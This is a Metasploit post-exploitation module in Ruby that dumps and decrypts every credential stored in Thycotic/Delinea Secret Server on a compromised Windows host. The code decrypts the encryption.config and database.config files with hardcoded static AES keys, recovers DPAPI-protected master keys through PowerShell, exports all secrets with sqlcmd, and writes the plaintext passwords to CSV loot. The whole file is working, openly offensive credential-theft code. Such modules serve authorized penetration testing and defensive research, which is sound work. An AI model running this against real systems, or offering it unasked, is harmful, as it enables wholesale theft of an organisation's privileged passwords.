##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::MSSQL
  include Msf::Post::Windows::Powershell
  include Msf::Post::Windows::Registry

  Rank = ManualRanking
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Delia Thycotic Secret Server Dump',
        'Description' => %q{
          This module exports and decrypts Secret Server credentials to a CSV file;
          it is intended as a post-exploitation module for Windows hosts with Delia/Thycotic
          Secret Server installed. Master Encryption Key (MEK) and associated IV values are
          decrypted from encryption.config using a static key baked into the software. The
          module also supports parameter recovery for encryption configs configured with
          Windows DPAPI. An optional parameter "LOOT_ONLY" allows the encryption keys and
          encrypted database to be plundered for late offline decryption in situations where
          expedience is necessary.
        },
        'Author' => 'npm[at]cesium137.io',
        'Platform' => [ 'win' ],
        'DisclosureDate' => '2022-08-15',
        'SessionTypes' => [ 'meterpreter' ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/denandz/SecretServerSecretStealer']
        ],
        'Actions' => [
          [
            'Dump',
            {
              'Description' => 'Export Secret Server database and perform decryption'
            }
          ],
          [
            'Export',
            {
              'Description' => 'Export Secret Server database'
            }
          ],
          [
            'Decrypt',
            {
              'Description' => 'Decrypt Secret Server Database export'
            }
          ],
        ],
        'DefaultAction' => 'Dump',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ IOC_IN_LOGS ]
        },
        'Privileged' => true
      )
    )
    register_options([
      OptPath.new('CSVFILE', [ false, 'Path to database dump CSV file' ]),
      OptInt.new('SESSION', [ false, 'The session to run this module on' ])
    ])
    register_advanced_options([
      OptFloat.new('BUILD', [ false, 'Secret Server version / build number (ex: 10.2)' ]),
      OptString.new('KEY', [ false, 'SecretServer 128-bit AES MEK value (hex)' ]),
      OptString.new('KEY256', [ false, 'SecretServer 256-bit AES MEK value (hex)' ]),
      OptString.new('IV', [ false, 'SecretServer MEK IV (hex)' ]),
      OptString.new('IP', [ false, 'Optional IPv4 address to attach to loot if sessionless', '127.0.0.1' ])
    ])
  end

  def current_session
    datastore['SESSION']
  end

  def csv_loot
    datastore['CSVFILE']
  end

  def ss_key
    @ss_key ||= datastore['KEY']
  end

  def ss_key256
    @ss_key256 ||= datastore['KEY256']
  end

  def ss_iv
    @ss_iv ||= datastore['IV']
  end

  def ss_build
    @ss_build ||= datastore['BUILD']
  end

  def loot_host
    datastore['IP']
  end

  def export_header_row_legacy
    'SecretID,Active,SecretType,SecretName,IsEncrypted,IsSalted,Use256Key,SecretFieldName,ItemValue,ItemValue2,IV'
  end

  def export_header_row_modern
    'SecretID,Active,SecretType,SecretName,IsEncrypted,IsSalted,Use256Key,SecretFieldName,ItemKey,IvMEK,ItemValue,ItemValue2,IV'
  end

  def result_header_row
    'SecretID,Active,SecretType,SecretName,FieldName,Plaintext,Plaintext2'
  end

  def run
    current_action = action.name.downcase
    if current_action == 'decrypt' && !csv_loot
      print_error('No database export file specified')
      raise Msf::OptionValidateError, ['CSVFILE']
    end
    if current_session < 0
      raise Msf::OptionValidateError, ['KEY'] if ss_key.nil?

      unless ss_key.length == 32 && ss_key.match?(/^[0-9a-f]+$/i)
        print_error('Key value must be 16 byte / 32 char hexadecimal')
        raise Msf::OptionValidateError, ['KEY']
      end
      raise Msf::OptionValidateError, ['KEY256'] if ss_key256.nil?

      unless ss_key256.length == 64 && ss_key256.match?(/^[0-9a-f]+$/i)
        print_error('Key256 value must be 32 byte / 64 char hexadecimal')
        raise Msf::OptionValidateError, ['KEY256']
      end
      raise Msf::OptionValidateError, ['IV'] if ss_iv.nil?

      unless ss_iv.length == 32 && ss_iv.match?(/^[0-9a-f]+$/i)
        print_error('IV value must be 16 byte / 32 char hexadecimal')
        raise Msf::OptionValidateError, ['IV']
      end
      @ss_key = [ss_key].pack('H*')
      @ss_key256 = [ss_key256].pack('H*')
      @ss_iv = [ss_iv].pack('H*')
      if ss_build.nil? || ss_build <= 0
        print_error('Please specify the target build of Secret Server for offline decryption')
        raise Msf::OptionValidateError, ['BUILD']
      end
      @ss_build = ss_build.to_f
    else
      init_module
    end
    case current_action
    when 'dump'
      fail_with(Msf::Exploit::Failure::NoTarget, 'Dump is not a supported action without a valid session') unless current_session > 0
      print_status('Performing export and decryption of Secret Server SQL database')
      encrypted_csv_file = export
      print_good("Encrypted Secret Server Database Dump: #{encrypted_csv_file}")
      decrypted_csv_file = decrypt(encrypted_csv_file)
      print_good("Decrypted Secret Server Database Dump: #{decrypted_csv_file}")
    when 'export'
      fail_with(Msf::Exploit::Failure::NoTarget, 'Export is not a supported action without a valid session') unless current_session > 0
      print_status('Performing export of Secret Server SQL database to CSV file')
      encrypted_csv_file = export
      print_good("Encrypted Secret Server Database Dump: #{encrypted_csv_file}")
    when 'decrypt'
      print_status('Performing decryption of Secret Server SQL database export')
      decrypted_csv_file = decrypt(csv_loot)
      print_good("Decrypted Secret Server Database Dump: #{decrypted_csv_file}")
    end
  end

  def export
    csv = dump_thycotic_db
    total_rows = csv.count
    print_good("#{total_rows} rows exported, #{@ss_total_secrets} unique SecretIDs")
    encrypted_data = csv.to_s.delete("\000")
    store_loot('thycotic_secretserver_enc', 'text/csv', rhost, encrypted_data, "#{@ss_db_name}.csv", 'Encrypted Database Dump')
  end

  def decrypt(csv_file)
    csv = read_csv_file(csv_file)
    total_rows = csv.count
    fail_with(Msf::Exploit::Failure::NoTarget, 'No rows in import file CSV dataset') unless total_rows > 1
    print_good("#{total_rows} rows loaded, #{@ss_total_secrets} unique SecretIDs")
    result = decrypt_thycotic_db(csv)
    ss_processed_rows = result[:processed_rows]
    ss_blank_rows = result[:blank_rows]
    ss_decrypted_rows = result[:decrypted_rows]
    ss_plaintext_rows = result[:plaintext_rows]
    ss_failed_rows = result[:failed_rows]
    result_rows = result[:result_csv]
    print_error('Failed to decrypt CSV dataset') unless result_rows
    total_result_rows = result_rows.count - 1 # Do not count header row
    total_result_secrets = result_rows['SecretID'].uniq.count - 1
    if ss_processed_rows == ss_failed_rows || total_result_rows <= 0
      print_error('No rows could be processed')
    elsif ss_failed_rows > 0
      print_warning("#{ss_processed_rows} rows processed (#{ss_failed_rows} rows failed)")
    else
      print_good("#{ss_processed_rows} rows processed")
    end
    total_records = ss_decrypted_rows + ss_plaintext_rows
    print_status("#{total_records} rows recovered: #{ss_plaintext_rows} plaintext, #{ss_decrypted_rows} decrypted (#{ss_blank_rows} blank)")
    decrypted_data = result_rows.to_s.delete("\000")
    print_status("#{total_result_rows} rows written (#{ss_blank_rows} blank rows withheld)")
    print_good("#{total_result_secrets} unique SecretID records recovered")
    store_loot('thycotic_secretserver_dec', 'text/csv', rhost, decrypted_data, "#{@ss_db_name}.csv", 'Decrypted Database Dump')
  end

  def dump_thycotic_db
    if @ss_build <= 8.7 # REALLY old-style: ItemKey and MekIV do not exist
      sql_query = 'SET NOCOUNT ON;SELECT s.SecretID,s.Active,CONVERT(VARBINARY(256),t.SecretTypeName) SecretType,
        CONVERT(VARBINARY(256),s.SecretName) SecretName,i.IsEncrypted,i.IsSalted,i.Use256Key,
        CONVERT(VARBINARY(256),f.SecretFieldName) SecretFieldName,i.ItemValue,i.ItemValue2,i.IV
        FROM tbSecretItem AS i JOIN tbSecret AS s ON (s.SecretID=i.SecretID)
        JOIN tbSecretField AS f ON (i.SecretFieldID=f.SecretFieldID) JOIN tbSecretType AS t ON (s.SecretTypeId=t.SecretTypeID)'
      export_header_row = export_header_row_legacy
    else # All other versions seem to support this schema
      sql_query = 'SET NOCOUNT ON;SELECT s.SecretID,s.Active,CONVERT(VARBINARY(256),t.SecretTypeName) SecretType,
        CONVERT(VARBINARY(256),s.SecretName) SecretName,i.IsEncrypted,i.IsSalted,i.Use256Key,
        CONVERT(VARBINARY(256),f.SecretFieldName) SecretFieldName,s.[Key],s.IvMEK,i.ItemValue,i.ItemValue2,i.IV
        FROM tbSecretItem AS i JOIN tbSecret AS s ON (s.SecretID=i.SecretID)
        JOIN tbSecretField AS f ON (i.SecretFieldID=f.SecretFieldID) JOIN tbSecretType AS t ON (s.SecretTypeId=t.SecretTypeID)'
      export_header_row = export_header_row_modern
    end
    if @ss_db_integrated_auth
      sql_cmd = "#{@sql_client} -d \"#{@ss_db_name}\" -S #{@ss_db_instance_path} -E -Q \"#{sql_query}\" -h-1 -s\",\" -w 65535 -W -I"
    else
      sql_cmd = "#{@sql_client} -d \"#{@ss_db_name}\" -S #{@ss_db_instance_path} -U \"#{@ss_db_user}\" -P \"#{@ss_db_pass}\" -Q \"#{sql_query}\" -h-1 -s\",\" -w 65535 -W -I"
    end
    print_status('Export Secret Server DB ...')
    query_result = cmd_exec(sql_cmd)
    csv = CSV.parse(query_result.gsub("\r", ''), row_sep: :auto, headers: export_header_row, quote_char: "\x00", skip_blanks: true)
    fail_with(Msf::Exploit::Failure::UnexpectedReply, 'Error parsing SQL dataset into CSV format') unless csv
    @ss_total_secrets = csv['SecretID'].uniq.count
    fail_with(Msf::Exploit::Failure::NoTarget, 'SQL dataset contains no SecretID column values') unless @ss_total_secrets >= 1 && !csv['SecretID'].uniq.first.nil?
    csv
  end

  def decrypt_thycotic_db(csv_dataset)
    current_row = 0
    decrypted_rows = 0
    plaintext_rows = 0
    blank_rows = 0
    failed_rows = 0
    result_csv = CSV.parse(result_header_row, headers: :first_row, write_headers: true, return_headers: true)
    print_status('Process Secret Server DB ...')
    csv_dataset.each do |row|
      current_row += 1
      secret_id = row['SecretID']
      if secret_id.nil?
        failed_rows += 1
        print_error("Row #{current_row} missing SecretID column, skipping")
        next
      end
      secret_field = [row['SecretFieldName'][2..]].pack('H*')
      secret_ciphertext_1 = row['ItemValue']
      if secret_ciphertext_1.nil?
        vprint_warning("SecretID #{secret_id} field '#{secret_field}' ItemValue column nil, excluding")
        blank_rows += 1
        next
      end
      secret_ciphertext_2 = row['ItemValue2']
      secret_active = row['Active'].to_i
      secret_name = [row['SecretName'][2..]].pack('H*')
      secret_type = [row['SecretType'][2..]].pack('H*')
      secret_encrypted = row['IsEncrypted'].to_i
      secret_salted = row['IsSalted'].to_i
      secret_use256 = row['Use256Key'].to_i
      secret_iv_hex = row['IV'][2..]
      if @ss_build >= 10.4 || secret_iv_hex == 'FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF' # New-style: ItemKey and ItemIV are part of the key blob
        secret_keyfield_hex = row['ItemKey'][2..]
        miv_hex = secret_keyfield_hex[4..35]
        key_hex = secret_keyfield_hex[100..]
        iv_hex = secret_ciphertext_1[4..35]
        value_1_hex = secret_ciphertext_1[100..]
      elsif @ss_build <= 8.7 # REALLY old-style: ItemKey and MekIV do not exist
        key_hex = ['FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF'].pack('H*')
        miv_hex = ['FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF'].pack('H*')
        iv_hex = secret_iv_hex
        value_1_hex = secret_ciphertext_1
      else # Old-style: ItemKey and ItemIV are stored as columns
        key_hex = row['ItemKey'][2..]
        miv_hex = row['IvMEK'][2..]
        iv_hex = secret_iv_hex
        value_1_hex = secret_ciphertext_1
      end
      value_1 = [value_1_hex].pack('H*')
      key = [key_hex].pack('H*')
      iv = [iv_hex].pack('H*')
      miv = [miv_hex].pack('H*')
      if secret_encrypted == 1
        secret_plaintext_1 = thycotic_secret_decrypt(secret_id: secret_id, secret_field: secret_field, secret_value: value_1, secret_key: key, secret_iv: iv, secret_miv: miv, secret_use256: secret_use256, secret_salted: secret_salted)
        if secret_plaintext_1.nil?
          vprint_warning("SecretID #{secret_id} field '#{secret_field}' decrypted ItemValue nil, excluding")
          blank_rows += 1
          next
        end
        # TODO: Figure out how ItemValue2 is encrypted; it does not match the structure of ItemValue.
        # For now just return ciphertext if it exists.
        secret_plaintext_2 = secret_ciphertext_2
        if !secret_plaintext_1 || !secret_plaintext_2
          print_error("SecretID #{secret_id} field '#{secret_field}' failed to decrypt")
          vprint_error(row.to_s)
          failed_rows += 1
          next
        end
        secret_disposition = 'decrypted'
        decrypted_rows += 1
      else
        secret_plaintext_1 = secret_ciphertext_1
        secret_plaintext_2 = secret_ciphertext_2
        secret_disposition = 'plaintext'
        plaintext_rows += 1
      end
      if !secret_plaintext_1.empty? && !secret_plaintext_2.empty?
        result_line = [secret_id.to_s, secret_active.to_s, secret_type.to_s, secret_name.to_s, secret_field.to_s, secret_plaintext_1.to_s, secret_plaintext_2.to_s]
        result_row = CSV.parse_line(CSV.generate_line(result_line).gsub("\r", ''))
        result_csv << result_row
        vprint_status("SecretID #{secret_id} field '#{secret_field}' ItemValue recovered: #{secret_disposition}")
      else
        vprint_warning("SecretID #{secret_id} field '#{secret_field}' recovered ItemValue empty, excluding")
        blank_rows += 1
      end
    end
    {
      processed_rows: current_row,
      blank_rows: blank_rows,
      decrypted_rows: decrypted_rows,
      plaintext_rows: plaintext_rows,
      failed_rows: failed_rows,
      result_csv: result_csv
    }
  end

  def init_module
    @ss_hostname = get_env('COMPUTERNAME')
    print_status("Hostname #{@ss_hostname} IPv4 #{rhost}")
    get_sql_client
    fail_with(Failure::Unknown, 'Unable to identify sqlcmd SQL client on target host') unless @sql_client == 'sqlcmd'
    vprint_good("Found SQL client: #{@sql_client}")
    ss_web_path = get_secretserver_web_path
    init_thycotic_db(ss_web_path)
    get_secretserver_version
    init_thycotic_encryption(ss_web_path)
  end

  def read_csv_file(file_name)
    csv_rows = File.binread(file_name)
    csv = CSV.parse(csv_rows.gsub("\r", ''), row_sep: :auto, headers: :first_row, quote_char: "\x00", skip_blanks: true)
    unless csv
      print_error("Error importing CSV file #{csv_file}")
      return false
    end
    @ss_total_secrets = csv['SecretID'].uniq.count
    unless @ss_total_secrets >= 1 && !csv['SecretID'].uniq.first.nil?
      print_error("Provided CSV file #{csv_file} contains no SecretID column values")
      return false
    end
    csv
  end

  def get_secretserver_web_path
    reg_key = 'HKLM\\SOFTWARE\\Thycotic\\Secret Server\\'
    fail_with(Msf::Exploit::Failure::NotFound, "Registry key #{reg_key} not found") unless registry_key_exist?(reg_key)
    ss_web_path = registry_getvaldata(reg_key, 'WebDir')
    fail_with(Msf::Exploit::Failure::NotFound, "Could not find WebDir registry entry under #{reg_key}") unless ss_web_path
    vprint_status('Secret Server Web Root:')
    vprint_status("\t#{ss_web_path}")
    ss_web_path
  end

  def get_secretserver_version
    if @ss_db_integrated_auth
      version_sql_cmd = "#{@sql_client} -d \"#{@ss_db_name}\" -S #{@ss_db_instance_path} -E -Q \"
        SET NOCOUNT ON;
        SELECT TOP 1 CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 1))) AS [Major],
        CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 2))) AS [Minor],
        CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 3))) AS [Rev]
        FROM tbVersion ORDER BY [Major] DESC, [Minor] DESC, [Rev] DESC\" -h-1 -s\",\" -w 65535 -W -I"
    else
      version_sql_cmd = "#{@sql_client} -d \"#{@ss_db_name}\" -S #{@ss_db_instance_path} -U \"#{@ss_db_user}\" -P \"#{@ss_db_pass}\" -Q \"
        SET NOCOUNT ON;
        SELECT TOP 1 CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 1))) AS [Major],
        CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 2))) AS [Minor],
        CONVERT(INT,REVERSE(PARSENAME(REPLACE(REVERSE(VersionNumber), ',', '.'), 3))) AS [Rev]
        FROM tbVersion ORDER BY [Major] DESC, [Minor] DESC, [Rev] DESC\" -h-1 -s\",\" -w 65535 -W -I"
    end
    version_query_result = cmd_exec(version_sql_cmd).gsub("\r", '')
    csv = CSV.parse(version_query_result.gsub("\r", ''), row_sep: :auto, headers: 'Major,Minor,Rev', quote_char: "\x00", skip_blanks: true)
    fail_with(Msf::Exploit::Failure::NoTarget, 'Error parsing SQL dataset into CSV format') unless csv
    ss_build_major = csv['Major'].first.to_i
    ss_build_minor = csv['Minor'].first.to_i
    ss_build_rev = csv['Rev'].first.to_i
    @ss_build = "#{ss_build_major}.#{ss_build_minor}.#{ss_build_rev}".to_f
    fail_with(Msf::Exploit::Failure::Unknown, 'Error determining Secret Server version from SQL query') unless @ss_build > 0
    print_status("Secret Server Build #{@ss_build}")
    print_warning('This module has not been tested against Secret Server versions below 8.4 and may not work') if @ss_build < 8.4
  end

  def read_config_file(ss_config_file)
    fail_with(Msf::Exploit::Failure::NotFound, "#{ss_config_file} not found") unless file_exist?(ss_config_file)
    read_file(ss_config_file)
  end

  def init_thycotic_encryption(ss_web_path)
    print_status('Decrypt encryption.config ...')
    ss_enc_config_file = ss_web_path + 'encryption.config'
    ss_enc_conf_bytes = read_config_file(ss_enc_config_file)
    if @ss_build >= 10.4
      vprint_status('Using Modern (AES-256 + XOR) file decryption routine')
      enc_conf = thycotic_encryption_config_decrypt_modern(ss_enc_conf_bytes)
    else
      vprint_status('Using Legacy (AES-128) file decryption routine')
      enc_conf = thycotic_encryption_config_decrypt_legacy(ss_enc_conf_bytes)
    end
    fail_with(Msf::Exploit::Failure::Unknown, 'Failed to decrypt encryption.config') unless enc_conf
    ss_key_hex = enc_conf['KEY']
    ss_key256_hex = enc_conf['KEY256']
    ss_iv_hex = enc_conf['IV']
    if enc_conf['ISENCRYPTEDWITHDPAPI'].to_s.upcase == 'TRUE'
      print_status('DPAPI encryption has been configured for the Master Encryption Key, attempting LocalMachine decryption ...')
      ss_key_hex = dpapi_decrypt(ss_key_hex)
      ss_key256_hex = dpapi_decrypt(ss_key256_hex)
    end
    fail_with(Msf::Exploit::Failure::Unknown, "Failed to recover Master Encryption Key values from #{ss_enc_config_file}") if ss_key_hex.nil? || ss_key256_hex.nil? || ss_iv_hex.nil?
    @ss_iv = [ss_iv_hex].pack('H*')
    @ss_key = [ss_key_hex].pack('H*')
    @ss_key256 = [ss_key256_hex].pack('H*')
    extra_service_data = {
      address: Rex::Socket.getaddress(rhost),
      port: 443,
      service_name: 'aes',
      protocol: 'tcp',
      workspace_id: myworkspace_id,
      module_fullname: fullname,
      origin_type: :service,
      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
      realm_value: @ss_hostname
    }
    store_valid_credential(user: 'KEY', private: ss_key_hex, service_data: extra_service_data)
    store_valid_credential(user: 'KEY256', private: ss_key256_hex, service_data: extra_service_data)
    store_valid_credential(user: 'IV', private: ss_iv_hex, service_data: extra_service_data)
    print_good('Secret Server Encryption Configuration:')
    print_good("\t   KEY: #{ss_key_hex}")
    print_good("\tKEY256: #{ss_key256_hex}")
    print_good("\t    IV: #{ss_iv_hex}")
  end

  def thycotic_encryption_config_decrypt_modern(enc_conf_bytes)
    res = {}
    # Burned-in static keys and IV
    aes_key = ['83fb558645767abb199755eafb4fbc5167113da8ee69f13267388dc3adcdb088'].pack('H*')
    aes_iv = ['ad478c63f93d5201e0a1bbfff0072b6b'].pack('H*')
    xor_key = '8200ab18b1a1965f1759c891e87bc32f208843331d83195c21ee03148b531a0e'.scan(/../).map(&:hex)
    ciphertext_bytes = enc_conf_bytes[41..]
    return false unless (plaintext_conf = aes_cbc_decrypt(ciphertext_bytes, aes_key, aes_iv))

    xor_1 = plaintext_conf[1..4].unpack('l*').first
    xor_2 = plaintext_conf[5..8].unpack('l*').first
    num_keys = xor_1 ^ xor_2
    working_offset = 9
    i = 1
    until i > num_keys
      k = nil
      v = nil
      for is_key in [true, false] do
        idx_xor = plaintext_conf[working_offset..working_offset + 3].unpack('l*').first
        idx_len = plaintext_conf[working_offset + 4..working_offset + 7].unpack('l*').first
        len = idx_len ^ idx_xor
        key_xor = plaintext_conf[working_offset + 8..working_offset + 7 + len].unpack('C*')
        plaintext = xor_decrypt(key_xor, xor_key).pack('C*')
        working_offset += len + 8
        if is_key
          k = plaintext.delete("\000")
        else
          v = plaintext.delete("\000")
        end
      end
      if !k
        next
      else
        res[k.upcase] = v
      end

      i += 1
    end
    res
  end

  def thycotic_encryption_config_decrypt_legacy(enc_conf_bytes)
    res = {}
    # Burned-in static keys and IV
    aes_key_legacy = ['020216980119760c0b79017097830b1d'].pack('H*')
    aes_iv_legacy = ['7a790a22020b6eb3630cdd080310d40a'].pack('H*')
    ciphertext_bytes = enc_conf_bytes
    return false unless (plaintext_conf = aes_cbc_decrypt(ciphertext_bytes, aes_key_legacy, aes_iv_legacy).delete("\000"))

    working_offset = (plaintext_conf.unpack('H*').first.downcase.index(/4b65790556616c7565/) / 2) + 14 # magic bytes
    loop do
      k = nil
      v = nil
      for is_key in [true, false] do
        data_len = plaintext_conf[working_offset..working_offset + 1].unpack('C*').first
        data_val = plaintext_conf[working_offset + 1, data_len]
        if is_key
          k = data_val
          working_offset += data_len + 3
        else
          v = data_val
          working_offset += data_len + 6
        end
      end
      if !k
        next
      else
        res[k.upcase] = v
      end
      break if working_offset >= plaintext_conf.length
    end
    res
  end

  def init_thycotic_db(ss_web_path)
    print_status('Decrypt database.config ...')
    ss_db_config_file = ss_web_path + 'database.config'
    db_conf = get_thycotic_database_config(read_config_file(ss_db_config_file))
    db_instance_path = db_conf['DATA SOURCE']
    db_name = db_conf['INITIAL CATALOG']
    db_user = db_conf['USER ID']
    db_pass = db_conf['PASSWORD']
    db_auth = db_conf['INTEGRATED SECURITY']
    fail_with(Msf::Exploit::Failure::NoTarget, "Failed to recover database parameters from #{ss_db_config_file}") if db_instance_path.nil? || db_name.nil?
    @ss_db_instance_path = db_instance_path
    @ss_db_name = db_name
    print_good('Secret Server SQL Database Connection Configuration:')
    print_good("\tInstance Name: #{@ss_db_instance_path}")
    print_good("\tDatabase Name: #{@ss_db_name}")
    @ss_db_integrated_auth = false
    if !db_auth.nil?
      @ss_db_integrated_auth = true unless db_auth.downcase != 'true'
    elsif !db_user.nil? && !db_pass.nil?
      @ss_db_user = db_user
      @ss_db_pass = db_pass
      extra_service_data = {
        address: Rex::Socket.getaddress(rhost),
        port: 1433,
        service_name: 'mssql',
        protocol: 'tcp',
        workspace_id: myworkspace_id,
        module_fullname: fullname,
        origin_type: :service,
        realm_key: Metasploit::Model::Realm::Key::WILDCARD,
        realm_value: @ss_db_instance_path
      }
      store_valid_credential(user: @ss_db_user, private: @ss_db_pass, service_data: extra_service_data)
      print_good("\tDatabase User: #{@ss_db_user}")
      print_good("\tDatabase Pass: #{@ss_db_pass}")
    else
      fail_with(Msf::Exploit::Failure::NoTarget, "Could not extract SQL login information from #{ss_db_config_file}")
    end
    if @ss_db_integrated_auth
      print_good("\tDatabase User: (Windows Integrated)")
      print_warning('The database uses Windows authentication')
      print_warning('Your Meterpreter username / session identity must have access to the SQL server instance to proceed')
    end
  end

  def get_thycotic_database_config(db_conf_bytes)
    res = {}
    # Burned-in static keys and IV
    aes_key = ['020216980119760c0b79017097830b1d'].pack('H*')
    aes_iv = ['7a790a22020b6eb3630cdd080310d40a'].pack('H*')
    fail_with(Msf::Exploit::Failure::NoTarget, 'Error decrypting database.config') unless (plaintext_conf = aes_cbc_decrypt(db_conf_bytes, aes_key, aes_iv).delete("\000"))
    fail_with(Msf::Exploit::Failure::NoTarget, 'Could not extract connectionString from database.config') unless (db_str = get_thycotic_database_string(plaintext_conf))
    db_connection_elements = db_str.split(';')
    db_connection_elements.each do |element|
      pair = element.to_s.split('=')
      k = pair[0]
      v = pair[1]
      res[k.upcase] = v
    end
    res
  end

  def get_thycotic_database_string(plaintext_conf)
    return false unless plaintext_conf.match?(/connectionString/i)

    working_offset = plaintext_conf.index(/connectionString/i) + 18
    byte_len = plaintext_conf.length - working_offset
    working_bytes = plaintext_conf[working_offset, byte_len]
    val_len = working_bytes[0].unpack('H*').first.to_i(16).to_i
    working_bytes[2, val_len]
  end

  def thycotic_secret_decrypt(options = {})
    secret_id = options.fetch(:secret_id)
    secret_field = options.fetch(:secret_field)
    secret_value = options.fetch(:secret_value)
    secret_key = options.fetch(:secret_key)
    secret_iv = options.fetch(:secret_iv)
    secret_miv = options.fetch(:secret_miv)
    secret_use256 = options.fetch(:secret_use256)
    secret_salted = options.fetch(:secret_salted)
    if secret_use256 == 1
      mek = ss_key256
    else
      mek = ss_key
    end
    if @ss_build > 8.7 && secret_salted == 1
      intermediate_key = aes_cbc_decrypt(secret_key, mek, secret_miv)
    elsif @ss_build > 8.7
      intermediate_key = secret_key
    else
      intermediate_key = mek
    end
    if intermediate_key
      decrypted_secret = aes_cbc_decrypt(secret_value, intermediate_key, secret_iv)
    else
      vprint_warning("SecretID #{secret_id} field '#{secret_field}' decryption failed, attempting ItemKey decryption")
      decrypted_secret = aes_cbc_decrypt(secret_value, secret_key, secret_iv)
    end
    unless decrypted_secret
      vprint_warning("SecretID #{secret_id} field '#{secret_field}' decryption failed, attempting MEK decryption")
      decrypted_secret = aes_cbc_decrypt(secret_value, mek, secret_iv)
    end
    return false unless decrypted_secret

    if @ss_build >= 10.4
      plaintext = decrypted_secret.delete("\000")[4..]
    else
      plaintext = decrypted_secret.delete("\000")
    end
    if !plaintext.to_s.empty?
      # Catch where decryption did not throw an exception but produced invalid UTF-8 plaintext
      # This was evident in a few test cases where the secret value appeared to have been pasted from Microsoft Word
      if !plaintext.force_encoding('UTF-8').valid_encoding?
        plaintext = Base64.strict_encode64(plaintext)
        print_warning("SecretID #{secret_id} field '#{secret_field}' contains invalid UTF-8 and will be stored as a Base64 string in the output file")
      end
      return plaintext
    else
      return nil
    end
  end

  def xor_decrypt(ciphertext_bytes, xor_key)
    pos = 0
    res = []
    for i in 0..ciphertext_bytes.length - 1 do
      res[i] = ciphertext_bytes[i] ^ xor_key[pos]
      pos += 1
      if pos == xor_key.length
        pos = 0
      end
    end
    res
  end

  def aes_cbc_decrypt(ciphertext_bytes, aes_key, aes_iv)
    return false unless aes_iv.length == 16

    case aes_key.length
    when 16
      decipher = OpenSSL::Cipher.new('aes-128-cbc')
    when 32
      decipher = OpenSSL::Cipher.new('aes-256-cbc')
    else
      return false
    end
    decipher.decrypt
    decipher.key = aes_key
    decipher.iv = aes_iv
    decipher.padding = 1
    decipher.update(ciphertext_bytes) + decipher.final
  rescue OpenSSL::Cipher::CipherError
    return false
  end

  def dpapi_decrypt(b64)
    cmd_str = "Add-Type -AssemblyName System.Security;[Text.Encoding]::ASCII.GetString([Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('#{b64}'), $Null, 'LocalMachine'))"
    plaintext = psh_exec(cmd_str)
    fail_with(Msf::Exploit::Failure::NoTarget, 'Failed DPAPI LocalMachine decryption') unless plaintext.match?(/^[0-9a-f]+$/i)
    plaintext
  end
end
